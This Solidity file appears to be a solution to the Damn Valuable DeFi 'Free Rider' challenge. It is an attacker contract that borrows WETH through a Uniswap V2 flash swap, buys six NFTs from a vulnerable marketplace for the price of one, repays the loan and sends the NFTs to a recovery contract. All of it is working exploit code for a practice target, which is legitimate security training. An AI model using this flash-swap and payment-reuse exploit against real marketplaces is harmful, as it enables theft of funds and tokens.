// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";
import "../DamnValuableNFT.sol";

import "hardhat/console.sol";

interface IWETH {
    function withdraw(uint256 wad) external;
    function approve(address guy, uint wad) external returns (bool);
    function transfer(address dst, uint wad) external returns (bool);
    function balanceOf(address guy) external view returns (uint);
    function deposit() external payable;
}

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    FreeRiderNFTMarketplace public marketplace;
    IUniswapV2Factory public factoryV2;
    IWETH public weth;
    IERC20 public token;
    DamnValuableNFT public nft;
    
    error StillNotOwningToken(uint256 tokenId);

    constructor(address _marketplace, address _uniswapFactory, address _weth, address _token, address _nft) public {
        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        factoryV2 = IUniswapV2Factory(_uniswapFactory);
        weth = IWETH(_weth);
        token = IERC20(_token);
        nft = DamnValuableNFT(_nft);
    }

    function startFlashSwap() external {
        address pair = factoryV2.getPair(address(token), address(weth));

        IUniswapV2Pair(pair).swap(
            15 ether,
            0,
            address(this),
            abi.encode(token, weth)
        );
    }

    function nftRecovery(address _recovery) external {
        FreeRiderRecovery recovery = FreeRiderRecovery(_recovery);

        for (uint i = 0; i < 6; i++) {
            if (nft.ownerOf(i) != address(this))
                revert StillNotOwningToken(i);

            nft.safeTransferFrom(address(this), address(recovery), i, abi.encode(msg.sender));
        }
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();

        uint fee = (amount0 * 3) / 997 + 1; // Uniswap fee (0.3%)
        uint amountToRepay = amount0 + fee;

        uint256[] memory tokenIds = new uint256[](6);

        for (uint i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        weth.withdraw(amount0);

        marketplace.buyMany{ value: 15 ether }(tokenIds);
        weth.deposit{
            value: amountToRepay
        }();

        console.log("Amount to repay: %s", amountToRepay);
        console.log("Attacker WETH balance: %s", weth.balanceOf(address(this)));
        console.log("Attacker ETH balance: %s", address(this).balance);

        weth.transfer(msg.sender, amountToRepay);

        console.log("Flash swap completed");
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
        external
        override
        returns (bytes4)
    {
        if (nft.ownerOf(_tokenId) != address(this))
            revert StillNotOwningToken(_tokenId);

        console.log("Received NFT: %s", _tokenId);

        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {
    }
}